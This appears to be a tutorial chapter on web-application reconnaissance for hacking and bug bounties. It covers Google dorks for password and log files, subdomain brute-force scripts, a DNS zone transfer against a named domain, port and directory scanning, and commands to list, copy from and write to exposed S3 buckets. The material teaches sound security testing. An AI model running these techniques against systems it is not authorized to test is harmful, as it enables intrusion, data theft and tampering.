# Recon

To exploit web applications efficiently, a wide array of skills is required. On the one hand, a hacker needs knowledge of network protocols, software development techniques, and common vulnerabilities found in various types of applications. But on the other hand, the hacker also needs to understand the application they are targeting. The more intimate this knowledge is, the better and more applicable it will be.

The hacker should understand the purpose of the application from a functional perspective.

Without deep understanding of the target application from a nontechnical perspective, it is actually difficult to determine what data and functionality matter.

- Who are its users?
- How does the application generate revenue?
- For what purpose do users select the application over competitors?
- Who are the competitors?
- What functionality is found in the application?

Ultimately, web application reconnaissance is about collecting data and building a model that combines a web application's technical and functional details in a way that allows you to fully understand the purpose and usage of a web application.

information is key — regardless of if it is technical in nature or not.

---

Reconnaissance is important because it's how you figure out an application's attack surface.

In particular, activities like port scanning, spidering, and directory brute-forcing can generate a lot of unwanted traffic on a site and may not be welcomed by the organization.

## Manually walking through the target

Before we dive into anything else, it will help to first manually walk through the application to learn more about it. Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don't usually use.

This should give you a rough idea of what the attack surface (all of the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.

## Google dorking

For the hacker, Google can be a means of discovering valuable information such as hidden admin portals, unlocked password files, and leaked authentication keys.

Google's search engine has its own built-in query language that helps you filter your searches. Here are some of the most useful operators that
can be used with any Google search:

### `site`

Tells Google to show you results from a certain site only. This will help you quickly find the most reputable source on the topic that you are
researching.

For example, if you wanted to search for the syntax of Python's print() function, you could limit your results to the official Python documentation with this search:

```
print site:python.org
```

### `inurl`

Searches for pages with a URL that match the search string. It's a powerful way to search for vulnerable pages on a particular website.

Let's say you've read a blog post about how the existence of a page called `/course/jumpto.php` on a website could indicate that it's vulnerable to remote code execution. You can check if the vulnerability exists on your target by searching:

```
inurl:"/course/jumpto.php" site:example.com
```

### `intitle`

Finds specific strings in a page's title. This is useful because it allows you to find pages that contain a particular type of content. For example, file-listing pages on web servers often have index of in their titles. You can use this query to search for directory pages on a website:

```
intitle:"index of" site:example.com
```

### `link`

Searches for web pages that contain links to a specified URL. You can use this to find documentation about obscure technologies or vulnerabilities. For example, let's say you're researching the uncommon regular expression denial-of-service (ReDoS) vulnerability. You'll easily pull up its definition online but might have a hard time finding examples.

The `link` operator can discover pages that reference the vulnerability's Wikipedia page to locate discussions of the same topic:

```
link:"https://en.wikipedia.org/wiki/ReDoS"
```

### `filetype`

Searches for pages with a specific file extension. This is an incredible tool for hacking; hackers often use it to locate files on their target sites that might be sensitive, such as log and password files. For example, this query searches for log files, which often have the .log file extension, on the target site:

```
filetype:log site:example.com
```

### Wildcard (`*`)

You can use the wildcard operator (\*) within searches to mean any character or series of characters. For example, the following query will return any string that starts with how to hack and ends with using Google. It will match with strings like how to hack websites using Google, how to hack applications using Google, and so on:

```
how to hack * using Google
```

### Quotes (`" "`)

Adding quotation marks around your search terms forces an exact match. For example, this query will search for pages that contain the phrase how
to hack:

```
"how to hack"
```

And this query will search for pages with the terms how, to, and hack, although not necessarily together: how to hack:

```
how to hack
```

### Or (`|`)

The or operator is denoted with the pipe character (`|`) and can be used to search for one search term or the other, or both at the same time.
The pipe character must be surrounded by spaces. For example, this query will search for how to hack on either Reddit or Stack Overflow:

```
"how to hack" site:(reddit.com | stackoverflow.com)
```

And this query will search for web pages that mention either SQL Injection or SQLi:

```
(SQL Injection | SQLi)
```

### Minus (`-`)

The minus operator (`-`) excludes certain search results. For example, let’s say you’re interested in learning about websites that discuss hacking, but not those that discuss hacking PHP. This query will search for pages that contain how to hack websites but not php:

```
"how to hack websites" -php
```

### Some more examples

#### Discovering subdomains

For example, look for all of a company’s subdomains by searching as follows:

```
site:*.example.com
```

#### Kibana

You can also look for special endpoints that can lead to vulnerabilities. Kibana is a data visualization tool that displays server operation data such as server logs, debug messages, and server status. A compromised Kibana instance can allow attackers to collect extensive information about a site’s operation. Many Kibana dashboards run under the path app/kibana, so this query will reveal whether the target has a Kibana dashboard. You can then try to access the dashboard to see if it’s unprotected:

```
site:example.com inurl:app/kibana
```

#### Target company's resources

Google can find company resources hosted by a third party online, such as Amazon S3 buckets:

```
site:s3.amazonaws.com COMPANY_NAME
```

#### Special sensitive extentions

In addition to .log, which often indicates log files, search for `.php`, `cfm`, `asp`, `.jsp`, and `.pl`, the extensions often used for script files:

```
site:example.com ext:php
site:example.com ext:log
```

#### Combine search terms

Finally, you can also combine search terms for a more accurate search. For example, this query searches the site example.com for text files that contain password:

```
site:example.com ext:txt password
```

### Hacking community

In addition to constructing your own queries, check out the Google Hacking Database (`https://www.exploit-db.com/google-hacking-database/`), a
website that hackers and security practitioners use to share Google search queries for finding security-related information. It contains many search queries that could be helpful to you during the recon process.

For example, you can find queries that look for files containing passwords, common URLs of admin portals, or pages built using vulnerable software.

> While you are performing recon using Google search, keep in mind that if you’re sending a lot of search queries, Google will start requiring CAPTCHA challenges for visitors from your network before they can perform more searches. This could be annoying to others on your network, so I don’t recommend Google dorking on a corporate or shared network.

## WHOIS and Reverse WHOIS

When companies or individuals register a domain name, they need to supply identifying information, such as their mailing address, phone number, and email address, to a domain registrar. Anyone can then query this information by using the whois command, which searches for the registrant and owner information of each known domain.

This information is not always available, as some organizations and individuals use a service called domain privacy, in which a third-party service provider replaces the user’s information with that of a forwarding service.

You could then conduct a reverse WHOIS search, searching a database by using an organization name, a phone number, or an email address to find
domains registered with it. This way, you can find all the domains that belong to the same owner. Reverse WHOIS is extremely useful for finding obscure or internal domains not otherwise disclosed to the public. Use a public reverse WHOIS tool like `ViewDNS.info` (https://viewdns.info/reversewhois/) to conduct this search. WHOIS and reverse WHOIS will give you a good set of top-level domains to work with.

## Web application mapping

You should learn how to build up a map that represents the structure, organization, and functionality of a web application. It is important to note that this should generally be the first step you take before attempting to hack into a web application.

We will use the term "map" here to define the data points collected regarding the code, network structure,
Web Application Mapping and feature set of an application. You will learn how to acquire the data required to fill a map in the next few chapters.

For robust applications, or applications you intend to test frequently and over long periods of time, you probably want a more robust solution to create and develop your map. Any format of mapping should be sufficient as long as it is easily traversable and capable of storing relevant information and relationships.

## IP Addresses

Another way of discovering your target’s top-level domains is to locate IP addresses. Find the IP address of a domain you know by running
the nslookup command:

```
nslookup facebook.com

<!-- returns -->
Server: 192.168.0.1
Address: 192.168.0.1#53
Non-authoritative answer:
Name: facebook.com
Address: 157.240.2.35
```

Once you’ve found the IP address of the known domain, perform a reverse IP lookup. Reverse IP searches look for domains hosted on the same
server, given an IP or domain. You can also use ViewDNS.info for this.

Also run the whois command on an IP address, and then see if the target has a dedicated IP range by checking the NetRange field. An IP range is a block of IP addresses that all belong to the same organization. If the organization has a dedicated IP range, any IP you find in that range belongs to that organization:

```
whois 157.240.2.35

<!-- returns -->
NetRange: 157.240.0.0 - 157.240.255.255
CIDR: 157.240.0.0/16
NetName: THEFA-3
NetHandle: NET-157-240-0-0-1
Parent: NET157 (NET-157-0-0-0-0)
NetType: Direct Assignment

OriginAS:
Organization: Facebook, Inc. (THEFA-3)
RegDate: 2015-05-14
Updated: 2015-05-14
Ref: https://rdap.arin.net/registry/ip/157.240.0.0
OrgName: Facebook, Inc.
OrgId: THEFA-3
Address: 1601 Willow Rd.
City: Menlo Park
StateProv: CA
PostalCode: 94025
Country: US
RegDate: 2004-08-11
Updated: 2012-04-17
Ref: https://rdap.arin.net/registry/entity/THEFA-3
OrgAbuseHandle: OPERA82-ARIN
OrgAbuseName: Operations
OrgAbusePhone: +1-650-543-4800
OrgAbuseEmail: noc@fb.com
OrgAbuseRef: https://rdap.arin.net/registry/entity/OPERA82-ARIN
OrgTechHandle: OPERA82-ARIN
OrgTechName: Operations
OrgTechPhone: +1-650-543-4800
OrgTechEmail: noc@fb.com
OrgTechRef: https://rdap.arin.net/registry/entity/OPERA82-ARIN
```

Another way of finding IP addresses in scope is by looking at autonomous systems, which are routable networks within the public internet. Autonomous system numbers (ASNs) identify the owners of these networks. By checking if two IP addresses share an ASN, you can determine whether the IPs belong to the same owner.

To figure out if a company owns a dedicated IP range, run several IP-to-ASN translations to see if the IP addresses map to a single ASN. If many addresses within a range belong to the same ASN, the organization might have a dedicated IP range. From the following output, we can deduce that any IP within the 157.240.2.21 to 157.240.2.34 range probably belongs to Facebook:

```
$ whois -h whois.cymru.com 157.240.2.20
AS    | IP           | AS Name
32934 | 157.240.2.20 | FACEBOOK, US
$ whois -h whois.cymru.com 157.240.2.27
AS    | IP           | AS Name
32934 | 157.240.2.27 | FACEBOOK, US
$ whois -h whois.cymru.com 157.240.2.35
AS    | IP           | AS Name
32934 | 157.240.2.35 | FACEBOOK, US
```

The `-h` flag in the whois command sets the WHOIS server to retrieve information from, and `whois.cymru.com` is a database that translates IPs to ASNs. If the company has a dedicated IP range and doesn’t mark those addresses as out of scope, you could plan to attack every IP in that range.

## Certificate parsing

Another way of finding hosts is to take advantage of the Secure Sockets Layer (SSL) certificates used to encrypt web traffic. An SSL certificate’s Subject Alternative Name field lets certificate owners specify additional hostnames that use the same certificate, so you can find those hostnames by parsing this field. Use online databases like crt.sh, Censys, and Cert Spotter to find certificates for a domain.

For example, by running a certificate search using `crt.sh` for `facebook.com`, we can find Facebook’s SSL certificate. You’ll see that that many other domain names belonging to Facebook are listed:

```
X509v3 Subject Alternative Name:
DNS:*.facebook.com
DNS:*.facebook.net
DNS:*.fbcdn.net
DNS:*.fbsbx.com
DNS:*.messenger.com
DNS:facebook.com
DNS:messenger.com
DNS:*.m.facebook.com
DNS:*.xx.fbcdn.net
DNS:*.xy.fbcdn.net
DNS:*.xz.fbcdn.net
```

The `crt.sh` website also has a useful utility that lets you retrieve the information in JSON format, rather than HTML, for easier parsing. Just add the URL parameter `output=json` to the request URL:

```
https://crt.sh/?q=facebook.com&output=json
```

## Finding subdomains

In order to scope out and test API endpoints, we should first be familiar with the domain structure a web application uses. In today's world it is rare for a single domain to be used to serve a web application in its entirety. More often than not, web applications will be split into at minimum client and server domains, plus the well-known "https://www" versus just "https://."

Take `https://www.mega-bank.com` as example. We are particularly curious if MegaBank has any other internet-accessible servers linked to the mega-bank.com domain name.

The first thing we should do is perform some recon and fill our web application map up with a list of subdomains attached to `mega-bank.com`. Most large consumer companies actually host a variety of subdomains attached to their primary domain. These subdomains are used for hosting a variety of services from email, to admin applications, file servers, and more.

There are many ways to find this data, and often you will have to try several to get the results you are looking for.

---

After finding as many domains on the target as possible, locate as many subdomains on those domains as you can. Each subdomain represents
a new angle for attacking the network. The best way to enumerate sub­domains is to use automation.

Tools like **Sublist3r**, **SubBrute**, **Amass**, and **Gobuster** can enumerate subdomains automatically with a variety of wordlists and strategies. For example, **Sublist3r** works by querying search engines and online subdomain databases, while **SubBrute** is a brute-forcing tool that guesses possible subdomains until it finds real ones. **Amass** uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases to find subdomains.

To use many subdomain enumeration tools, you need to feed the program a wordlist of terms likely to appear in subdomains. You can find some
good wordlists made by other hackers online. Daniel Miessler’s SecLists at `https://github.com/danielmiessler/SecLists/` is a pretty extensive one. You can also use a wordlist generation tool like **Commonspeak2** (`https://github.com/assetnote/commonspeak2/`) to generate wordlists based on the most current internet data.

Finally, you can combine several wordlists found online or that you generated yourself for the most comprehensive results. Here’s a simple command to remove duplicate items from a set of two wordlists:

```
sort -u wordlist1.txt wordlist2.txt
```

The sort command line tool sorts the lines of text files. When given multiple files, it will sort all files and write the output to the terminal. The `-u` option tells sort to return only unique items in the sorted list.

Gobuster is a tool for brute-forcing to discover subdomains, directories, and files on target web servers. Its DNS mode is used for subdomain brute-forcing. In this mode, you can use the flag -d to specify the domain you want to brute-force and -w to specify the wordlist you want to use:

```
gobuster dns -d target_domain -w wordlist
```

Once you’ve found a good number of subdomains, you can discover more by identifying patterns. For example, if you find two subdomains of example `.com` named `1.example.com` and `3.example.com`, you can guess that `2.example.com` is probably also a valid subdomain.

A good tool for automating this process is **Altdns** (`https://github.com/infosec-au/altdns/`), which discovers subdomains with names that are permutations of other subdomain names.

In addition, you can find more subdomains based on your knowledge about the company’s technology stack. For example, if you’ve already learned that example.com uses Jenkins, you can check if jenkins.example.com is a valid subdomain.

### Scripting brute-force subdomain discovery

As a final measure in discovering subdomains, brute force tactics can be used. These can be effective against web applications with few security mechanisms in place, but against more established and secure web applications we will find that our brute force must be structured very intelligently.

Let's build up a brute force algorithm in two steps using JavaScript. Our script should do the following:

1. Generate a list of potential subdomains.
2. Run through that list of subdomains, pinging each time to detect if a subdomain is live.
3. Record the live subdomains and do nothing with the unused subdomains.

We can generate subdomains using the following:

```js
/*
 * A simple function for brute forcing a list of subdomains
 * given a maximum length of each subdomain.
 */
const generateSubdomains = function (length) {
  /*
   * A list of characters from which to generate subdomains.
   *
   * This can be altered to include less common characters
   * like '-'.
   *
   * Chinese, Arabic, and Latin characters are also
   * supported by some browsers.
   */
  const charset = "abcdefghijklmnopqrstuvwxyz".split("");
  let subdomains = charset;
  let subdomain;
  let letter;
  let temp;
  /*
   * Time Complexity: o(n*m)
   * n = length of string
   * m = number of valid characters
   */
  for (let i = 1; i < length; i++) {
    temp = [];
    for (let k = 0; k < subdomains.length; k++) {
      subdomain = subdomains[k];
      for (let m = 0; m < charset.length; m++) {
        letter = charset[m];
        temp.push(subdomain + letter);
      }
    }
    subdomains = temp;
  }
  return subdomains;
};
const subdomains = generateSubdomains(4);
```

This script will generate every possible combination of characters of length `n`, where the list of characters to assemble subdomains from is `charset`. The algorithm works by splitting the charset string into an array of characters, then assigning the initial set of characters to that array of characters.

Next, we iterate for duration length, creating a temporary storage array at each iteration. Then we iterate for each subdomain, and each character in the charset array that specifies our available character set. Finally, we build up the temp array using combinations of existing subdomains and letters.

Now, using this list of subdomains, we can begin querying against a top-level domain (.com, .org., .net, etc.) like mega-bank.com. In order to do so, we will write a short script that takes advantage of the DNS library provided within Node.js—a popular JavaScript runtime.

```js
const dns = require("dns");
const promises = [];
/*
 * This list can be filled with the previous brute force
 * script, or use a dictionary of common subdomains.
 */
const subdomains = [];
/*
 * Iterate through each subdomain, and perform an asynchronous
 * DNS query against each subdomain.
 *
 * This is much more performant than the more common `dns.lookup()`
 * because `dns.lookup()` appears asynchronous from the JavaScript,
 * but relies on the operating system's getaddrinfo(3) which is
 * implemented synchronously.
 */
subdomains.forEach((subdomain) => {
  promises.push(
    new Promise((resolve, reject) => {
      dns.resolve(`${subdomain}.mega-bank.com`, function (err, ip) {
        return resolve({ subdomain: subdomain, ip: ip });
      });
    }),
  );
});
// after all of the DNS queries have completed, log the results
Promise.all(promises).then(function (results) {
  results.forEach((result) => {
    if (!!result.ip) {
      console.log(result);
    }
  });
});
```

After a short period of waiting, we will see a list of valid subdomains in the terminal:

```
{ subdomain: 'mail', ip: '12.32.244.156' },
{ subdomain: 'admin', ip: '123.42.12.222' },
{ subdomain: 'dev', ip: '12.21.240.117' },
{ subdomain: 'test', ip: '14.34.27.119' },
{ subdomain: 'www', ip: '12.14.220.224' },
{ subdomain: 'shop', ip: '128.127.244.11' },
{ subdomain: 'ftp', ip: '12.31.222.212' },
{ subdomain: 'forum', ip: '14.15.78.136' }
```

### Scripting dictionary brute-foce subdomain discovery

Rather than attempting every possible subdomain, we can speed up the process further by utilizing a dictionary attack instead of a brute force attack. Much like a brute force attack, a dictionary attack iterates through a wide array of potential subdomains, but instead of randomly generating them, they are pulled from a list of the most common subdomains.

the top 25 most common subdomains are as follows:

```
www
mail
ftp
localhost
webmail
smtp
pop
ns1
webdisk
ns2
cpanel
whm
autodiscover
autoconfig
m
imap
test
ns
blog
pop3
dev
www2
admin
forum
news
```

The dnscan repository on GitHub hosts files containing the top 10,000 subdomains that can be integrated into your recon process thanks to its very open GNU v3 license. You can find dnscan's subdomain lists, and source code on GitHub at `https://github.com/rbsec/dnscan`.

For large lists, like dnscan's 10,000 subdomain list, we should keep the data separate from the script and pull it in at runtime. This will make it much easier to modify the subdomain list, or make use of other subdomain lists. Most of these lists will be in .csv format, making integration into your subdomain recon script very simple:

```js
const dns = require("dns");
const csv = require("csv-parser");
const fs = require("fs");
const promises = [];
/*
 * Begin streaming the subdomain data from disk (versus
 * pulling it all into memory at once, in case it is a large file).
 *
 * On each line, call `dns.resolve` to query the subdomain and
 * check if it exists. Store these promises in the `promises` array.
 *
 * When all lines have been read, and all promises have been resolved,
 * then log the subdomains found to the console.
 *
 * Performance Upgrade: if the subdomains list is exceptionally large,
 * then a second file should be opened and the results should be
 * streamed to that file whenever a promise resolves.
 */
fs.createReadStream("subdomains-10000.txt")
  .pipe(csv())
  .on("data", (subdomain) => {
    promises.push(
      new Promise((resolve, reject) => {
        dns.resolve(`${subdomain}.mega-bank.com`, function (err, ip) {
          return resolve({ subdomain: subdomain, ip: ip });
        });
      }),
    );
  })
  .on("end", () => {
    // after all of the DNS queries have completed, log the results
    Promise.all(promises).then(function (results) {
      results.forEach((result) => {
        if (!!result.ip) {
          console.log(result);
        }
      });
    });
  });
```

Because the dictionary approach is much more efficient than the brute force approach, it may be wise to begin with a dictionary and then use a brute force subdomain generation only if the dictionary does not return the results you are seeking.

### Browser's built-in network analysis tools

To view these requests as they are being made, we can use our own web browser's network tools, or a more
powerful tool like **Burp**, **PortSwigger**, or **ZAP**.

### Zone Transfer Attacks

A zone transfer attack is a kind of recon trick that works against improperly configured Domain Name System (DNS) servers. Instead, it's just a information-gathering technique that takes little effort to use, and can give us some valuable information if it is successful. At its core, a DNS zone transfer attack is a specially formatted request on behalf of an individual that is designed to look like a valid DNS zone transfer request from a valid DNS server.

DNS zone transfers are a standardized way that DNS servers can share DNS records. Records are shared in a text-based format known as a **zone file**.

Zone files often contain DNS configuration data that is not intended to be easily accessible. As a result, a properly configured DNS master server should only be able to resolve zone transfer requests that are requested by another authorized DNS slave server. If a DNS server is not properly configured to only resolve requests for other specifically defined DNS servers, it will be vulnerable to bad actors.

We can find the DNS used by a specific website by:

```
host -t NS digikala.com
```

The expected output would be:

```
digikala.com name server u.ns2.digikalacloud.com.
digikala.com name server f.ns1.digikalacloud.com.
```

Then you can execute the Zone Transfer Attack:

```
host -l digikala.com f.ns1.digikalacloud.com
```

You should get a result like this if the DNS is configured improperly:

```
Using domain server:
Name: ns1.bankhost.com
Address: 195.11.100.25
Aliases:
digikala.com has address 195.250.100.195
digikala.com name server ns1.bankhost.com
digikala.com name server ns2.bankhost.com
mail.digikala.com has address 82.31.105.140
admin.digikala.com has address 32.45.105.144
internal.digikala.com has address 25.44.105.144
```

A properly configured server will give a different output when you request a zone transfer:

```
Using domain server:
Name: ns1.secure-bank.com
Address: 141.122.34.45
Aliases:

: Transfer Failed.
```

## Service enumration

Next, enumerate the services hosted on the machines you’ve found. Since services often run on default ports, a good way to find them is by port-scanning the machine with either active or passive scanning.

In _active scanning_, you directly engage with the server. Active scanning tools send requests to connect to the target machine’s ports to look
for open ones. You can use tools like **Nmap** or **Masscan** for active scanning. For example, this simple Nmap command reveals the open ports on `scanme.nmap.org`:

```
nmap scanme.nmap.org

<!-- returns -->
Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.086s latency).
Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f
Not shown: 993 closed ports
PORT STATE SERVICE
22/tcp open ssh
25/tcp filtered smtp
80/tcp open http
135/tcp filtered msrpc
445/tcp filtered microsoft-ds
9929/tcp open nping-echo
31337/tcp open Elite
Nmap done: 1 IP address (1 host up) scanned in 230.83 seconds
```

On the other hand, in _passive scanning_, you use third-party resources to learn about a machine’s ports without interacting with the server. Passive scanning is stealthier and helps attackers avoid detection. To find services on a machine without actively scanning it, you can use **Shodan**, a search engine that lets the user find machines connected to the internet.

Alternatives to Shodan include **Censys** and **Project Sonar**. Combine the information you gather from different databases for the best results. With these databases, you might also find your target’s IP addresses, certificates, and software versions.

## Directory brute-forcing

The next thing you can do to discover more of the site’s attack surface is brute-force the directories of the web servers you’ve found. Finding directories on servers is valuable, because through them, you might discover hidden admin panels, configuration files, password files, outdated functionalities, database copies, and source code files. Directory brute-forcing can sometimes allow you to directly take over a server!

You can use Dirsearch or Gobuster for directory brute-forcing. These tools use wordlists to construct URLs, and then request these URLs from
a web server. If the server responds with a status code in the 200 range, the directory or file exists. This means you can browse to the page and see what the application is hosting there. A status code of 404 means that the directory or file doesn’t exist, while 403 means it exists but is protected. Examine 403 pages carefully to see if you can bypass the protection to access the content.

Here’s an example of running a Dirsearch command. The `-u` flag specifies the hostname, and the `-e` flag specifies the file extension to use when constructing URLs:

```
$ ./dirsearch.py -u scanme.nmap.org -e php
Extensions: php | HTTP method: get | Threads: 10 | Wordlist size: 6023
Error Log: /tools/dirsearch/logs/errors.log
Target: scanme.nmap.org
[12:31:11] Starting:
[12:31:13] 403 - 290B - /.htusers
[12:31:15] 301 - 316B - /.svn -> http://scanme.nmap.org/.svn/
[12:31:15] 403 - 287B - /.svn/
[12:31:15] 403 - 298B - /.svn/all-wcprops
[12:31:15] 403 - 294B - /.svn/entries
[12:31:15] 403 - 297B - /.svn/prop-base/
[12:31:15] 403 - 296B - /.svn/pristine/
[12:31:15] 403 - 291B - /.svn/tmp/
[12:31:15] 403 - 315B - /.svn/text-base/index.php.svn-base
[12:31:15] 403 - 293B - /.svn/props/
[12:31:15] 403 - 297B - /.svn/text-base/
[12:31:40] 301 - 318B - /images -> http://scanme.nmap.org/images/
[12:31:40] 200 - 7KB - /index
[12:31:40] 200 - 7KB - /index.html
[12:31:53] 403 - 295B - /server-status
[12:31:53] 403 - 296B - /server-status/
[12:31:54] 301 - 318B - /shared -> http://scanme.nmap.org/shared/
Task Completed
```

Gobuster’s Dir mode is used to find additional content on a specific domain or subdomain. This includes hidden directories and files. In this
mode, you can use the `-u` flag to specify the domain or subdomain you want to brute-force and `-w` to specify the wordlist you want to use:

```
gobuster dir -u target_url -w wordlist
```

Manually visiting all the pages you’ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like **EyeWitness** (`https://github.com/FortyNorthSecurity/EyeWitness/`) or **Snapper** (`https://github.com/dxa4481/Snapper/`) to automatically verify that a page is hosted on each location. EyeWitness accepts a list of URLs and takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. Keep an eye out for hidden services, such as developer or admin panels, directory listing pages, analytics pages, and pages that look outdated and illumaintained. These are all common places for vulnerabilities to manifest.

## Spidering the site

Another way of discovering directories and paths is through web spidering, or web crawling, a process used to identify all pages on a site. A web spider tool starts with a page to visit. It then identifies all the URLs embedded on the page and visits them. By recursively visiting all URLs found on all pages of a site, the web spider can uncover many hidden endpoints in an application.

OWASP **Zed Attack Proxy (ZAP)** at `https://www.zaproxy.org/` has a built-in web spider you can use. This open source security tool includes a scanner, proxy, and many other features. **Burp Suite** has an equivalent tool called the `crawler`, but I prefer ZAP’s spider.

## Third-party hosting

Take a look at the company’s third-party hosting footprint. For example, look for the organization’s S3 buckets. S3, which stands for Simple Storage Service, is Amazon’s online storage product. Organizations can pay to store resources in buckets to serve in their web applications, or they can use S3 buckets as a backup or storage location. If an organization uses Amazon S3, its S3 buckets can contain hidden endpoints, logs, credentials, user information, source code, and other information that might be useful to you.

To find an organization's buckets, you can use Google dorking:

```
site:s3.amazonaws.com COMPANY_NAME
site:amazonaws.com COMPANY_NAME
```

If the company uses custom URLs for its S3 buckets, try more flexible search terms instead. Companies often still place keywords like aws and s3 in their custom bucket URLs, so try these searches:

```
amazonaws s3 COMPANY_NAME
amazonaws bucket COMPANY_NAME
amazonaws COMPANY_NAME
s3 COMPANY_NAME
```

**GrayhatWarfare** (`https://buckets.grayhatwarfare.com/`) is an online search engine you can use to find publicly exposed S3 buckets (Figure 5-7). It allows you to search for a bucket by using a keyword. Supply keywords related to your target, such as the application, project, or organization name, to find relevant buckets.

Finally, you can try to brute-force buckets by using keywords. **Lazys3** (`https://github.com/nahamsec/lazys3/`) is a tool that helps you do this. It relies on a wordlist to guess buckets that are permutations of common bucket names. Another good tool is **Bucket Stream** (`https://github.com/eth0izzle/bucket-stream/`), which parses certificates belonging to an organization and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also automatically checks whether the bucket is accessible, so it saves you time.

Once you’ve found a couple of buckets that belong to the target organization, use the AWS command line tool to see if you can access one. Install the tool by using the following command:

```
pip install awscli
```

Then configure it to work with AWS by following Amazon’s documentation at `https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html`. Now you should be able to access buckets directly from your terminal via the aws s3 command. Try listing the contents of the bucket you found:

```
aws s3 ls s3://BUCKET_NAME/
```

If this works, see if you can read the contents of any interesting files by copying files to your local machine:

```
aws s3 cp s3://BUCKET_NAME/FILE_NAME/path/to/local/directory
```

Gather any useful information leaked via the bucket and use it for future exploitation! If the organization reveals information such as **active API keys** or **personal information**, you should report this right away.

Exposed S3 buckets alone are often considered a vulnerability. You can also try to upload new files to the bucket or delete files from it. If you can mess with its contents, you might be able to tamper with the web application’s operations or corrupt company data. For example, this command will copy your local file named TEST_FILE into the target’s S3 bucket:

```
aws s3 cp TEST_FILE s3://BUCKET_NAME/
```

And this command will remove the TEST_FILE that you just uploaded:

```
aws s3 rm s3://BUCKET_NAME/TEST_FILE
```

These commands are a harmless way to prove that you have write access to a bucket without actually tampering with the target company’s files.
Always upload and remove your own test files. Don’t risk deleting important company resources during your testing unless you’re willing to entertain a costly lawsuit.

## Github Recon

Search an organization’s GitHub repositories for sensitive data that has been accidentally committed, or information that could lead to the discovery of a vulnerability.

Start by finding the GitHub usernames relevant to your target. You should be able to locate these by searching the organization’s name or product names via GitHub’s search bar, or by checking the GitHub accounts of known employees.

When you’ve found usernames to audit, visit their pages. Find repositories related to the projects you’re testing and record them, along with the usernames of the organization’s top contributors, which can help you find more relevant repositories.

Then dive into the code. For each repository, pay special attention to the Issues and Commits sections. These sections are full of potential info leaks: they could point attackers to unresolved bugs, problematic code, and the most recent code fixes and security patches. Recent code changes that haven’t stood the test of time are more likely to contain bugs. Look at any protection mechanisms implemented to see if you can bypass them. You can also search the Code section for potentially vulnerable code snippets. Once you’ve found a file of interest, check the Blame and History sections at the top-right corner of the file’s page to see how it was developed.

during the recon phase, look for **hardcoded secrets** such as API keys, encryption keys, and database passwords. Search the organization’s repositories for terms like key, secret, and password to locate hardcoded user credentials that you can use to access internal systems. After you’ve found leaked credentials, you can use **KeyHacks** (`https://github.com/streaak/keyhacks/`) to check if the credentials are valid and learn how to use them to access the target’s services.

You should also search for sensitive functionalities in the project. See if any of the source code deals with important functions such as authentication, password reset, state-changing actions, or private info reads. Pay attention to code that deals with user input, such as HTTP request parameters, HTTP headers, HTTP request paths, database entries, file reads, and file uploads, because they provide potential entry points for attackers to exploit the application’s vulnerabilities. Look for any configuration files, as they allow you to gather more information about your infrastructure. Also, search for old endpoints and S3 bucket URLs that you can attack.

Outdated dependencies and the unchecked use of dangerous functions are also a huge source of bugs. Pay attention to dependencies and imports
being used and go through the versions list to see if they’re outdated. Record any outdated dependencies. You can use this information later to
look for publicly disclosed vulnerabilities that would work on your target.

Tools like **Gitrob** and **TruffleHog** can automate the GitHub recon process. Gitrob (`https://github.com/michenriksen/gitrob/`) locates potentially sensitive files pushed to public repositories on GitHub. TruffleHog (`https://github.com/trufflesecurity/truffleHog/`) specializes in finding secrets in repositories by conducting regex searches and scanning for high-entropy strings.

## Techstack fingerprinting

Fingerprinting is identifying the software brands and versions that a machine or an application uses. This information allows you to per-
form targeted attacks on the application, because you can search for any known misconfigurations and publicly disclosed vulnerabilities related to a particular version.

The security community classifies known vulnerabilities as Common Vulnerabilities and Exposures (CVEs) and gives each CVE a number for reference. Search for them on the CVE database (`https://cve.mitre.org/cve/search_cve_list.html`).

The simplest way of fingerprinting an application is to engage with the application directly. First, run Nmap on a machine with the -sV flag on to enable version detection on the port scan. Here, you can see that Nmap attempted to fingerprint some software running on the target host for us:

```
$ nmap scanme.nmap.org -sV
Starting Nmap 7.60 ( https://nmap.org )
Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.065s latency).
Other addresses for scanme.nmap.org (not scanned): 2600:3c01::f03c:91ff:fe18:bb2f
Not shown: 992 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
25/tcp filtered smtp
80/tcp open http Apache httpd 2.4.7 ((Ubuntu))
135/tcp filtered msrpc
139/tcp filtered netbios-ssn
445/tcp filtered microsoft-ds
9929/tcp open nping-echo Nping echo
31337/tcp open tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 9.19 seconds
```

Next, in Burp, send an HTTP request to the server to check the HTTP headers used to gain insight into the tech stack. A server might leak many
pieces of information useful for fingerprinting its technology:

```
Server: Apache/2.0.6 (Ubuntu)
X-Powered-By: PHP/5.0.1
X-Generator: Drupal 8
X-Drupal-Dynamic-Cache: UNCACHEABLE
Set-Cookie: PHPSESSID=abcde;
```

The HTML source code of web pages can also provide clues. Many web frameworks or other technologies will embed a signature in source code.
Right-click a page, select View Source Code, and press CTRL-F to search for phrases like `powered by`, `built with`, and `running`. For instance, you might find `Powered by: WordPress 3.3.2` written in the source.

Check technology-specific file extensions, filenames, folders, and directories. For example, a file named phpmyadmin at the root directory, like `https://example.com/phpmyadmin`, means the application runs PHP. A directory named `jinja2` that contains templates means the site probably uses _Django_ and _Jinja2_. You can find more information about a specific technology’s filesystem signatures by visiting its individual documentation.

